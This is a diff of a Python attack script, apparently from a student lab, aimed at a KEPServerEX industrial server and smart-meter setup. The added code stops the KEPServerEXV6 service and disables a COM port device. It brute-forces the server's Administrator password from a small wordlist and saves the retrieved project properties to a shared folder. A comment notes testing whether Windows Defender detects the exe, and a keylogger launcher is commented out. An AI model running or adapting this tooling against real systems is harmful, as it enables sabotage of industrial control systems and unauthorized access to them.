@@ -15,7 +15,7 @@ from time import sleep
 import kepconfig
 import pkgutil
 
-/*
+'''
 
 Test disable_COMPort & bruteForceKEP
 
@@ -25,7 +25,8 @@ SS Reconscript & encryption/decryption contents
 
 Check if Windows Defender will detect our exe
 
-*/
+'''
+
 
 copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
 smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
@@ -152,6 +153,18 @@ def run_modinterrupt():
 #Disable COM Port
 def disable_COMPort():
 
+    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
+    if "RUNNING" in netshare.stdout:
+        print("Kepserver is running, Stopping now.")
+        service_name = "KEPServerEXV6"
+        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
+            sleep(15)
+
     cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
     dump = cp.stdout.split()
     deviceID = ""
@@ -164,28 +177,13 @@ def disable_COMPort():
     with open("script.bat", "w") as f:
         f.write(batchscript)
     cp = run(["script.bat"],stdout=PIPE ,shell=True)
-    print(cp.stdout.decode('utf-8'))
+    if "successfully" in cp.stdout.decode('utf-8'):
+        print(cp.stdout.decode('utf-8') + "\nOk.\n")
+    else:
+        # print(cp.stdout.decode('utf-8'))
+        print("Device not disabled. \nFail.\n")
+
     remove("script.bat")
-
-    # cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
-    # dump = cp.stdout.split()
-    # deviceID = ""
-    # for i in range(0, len(dump)):
-    #     if dump[i].decode("utf-8") == "ID:":
-    #         deviceID = dump[i+1].decode("utf-8")
-    #         if "CVBCx196117" in deviceID:
-    #             comPort = deviceID
-    # batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + comPort + "\""
-    # with open("script.bat", "w") as f:
-    #     f.write(batchscript)
-    # cp = run(["script.bat"],stdout=PIPE ,shell=True)
-    # if "successfully" in cp.stdout.decode('utf-8'):
-    #     print(cp.stdout.decode('utf-8') + "\nOk.\n")
-    # else:
-    #     # print(cp.stdout.decode('utf-8'))
-    #     print("Device not disabled. \nFail.\n")
-
-    # remove("script.bat")
     
 
 #Create Shared Folder
@@ -398,11 +396,11 @@ def clearEnergyReading():
         print("Error executing the executable file:", e)
         print("Fail.\n")
 
-def runKeylogger():
-    current_directory = getcwd()
-    executable_path = current_directory + "\\Keylogger.exe"
-    print("Keylogger running successfully.\nOk.\n")
-    check_call([executable_path])
+# def runKeylogger():
+#     current_directory = getcwd()
+#     executable_path = current_directory + "\\Keylogger.exe"
+#     print("Keylogger running successfully.\nOk.\n")
+#     check_call([executable_path])
 
 def bruteForceKEP():
 
@@ -421,33 +419,26 @@ def bruteForceKEP():
     
 
     print("Username: Administrator\n")
-    passwords = ["administrator2022", "superman" , "qaz2wsx", "7777777" , "michael"]
+    passwords = ["michael", "superman" , "7777777", "administrator2022" , "johnsnow"]
+    success = 0
 
     for password in passwords:
+        print("Trying: " + password)
         # Read and print each line in the file
+        try:
+            server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = 'Administrator', pw = password)
+            output = server.get_project_properties()
+            with open(copiedpath + "\\KEPServerProperties.txt", "w") as f:
+                f.write(str(output))
+            print("Success.\nOk.\n")
+            success = 1
+            break
+        except Exception as e:
+            print("Failed.\n")
+            continue
 
-        server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = 'Administrator', pw = password)
-        output = server.get_project_properties()
-        print(output)
-        with open(copiedpath + "\\KEPServerProperties.txt", "w") as f:
-            f.write(output)
-        print("SUCCESS: " + password + "\nOk.\n")
-
-
-
-    # for password in passwords:
-    #     # Read and print each line in the file
-    #     try:
-    #         server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = 'Administrator', pw = password)
-    #         output = server.get_project_properties()
-    #         print(output)
-    #         with open(copiedpath + "\\KEPServerProperties.txt", "w") as f:
-    #             f.write(output)
-    #         print("SUCCESS: " + password + "\nOk.\n")
-    #         break
-    #     except Exception as e:
-    #         print("FAIL: " + password)
-    #         continue
+    if success == 0:
+        print("\nFail.")
 
 
 def revert(revertoption):
